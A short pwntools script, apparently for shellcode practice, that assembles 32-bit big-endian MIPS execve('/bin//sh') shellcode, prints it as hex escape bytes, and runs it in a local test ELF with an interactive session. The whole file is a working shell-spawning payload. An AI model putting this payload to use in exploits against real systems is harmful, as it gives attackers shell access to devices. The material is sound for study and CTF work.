from pwn import *

context.update(arch='mips', os='linux', bits=32, endian='big')

shellcode = asm('''
  slti $a2,$zero,-1
  lui  $t7,0x2f62
  ori  $t7,$t7,0x696e
  sw   $t7,-20($sp)
  lui  $t6,0x2f2f
  ori  $t6,$t6,0x7368
  sw   $t6,-16($sp)
  sw   $zero,-12($sp)
  addiu $a0,$sp,-20
  sw   $a0,-8($sp)
  sw   $zero,-4($sp)
  addiu $a1,$sp,-8
  li   $v0,4011
  syscall 0x40404
''')

print(''.join(['\\x{:02x}'.format(ord(x)) for x in shellcode ]))

filename = make_elf(shellcode, extract=False)
p = process(filename)

pause()
p.interactive()
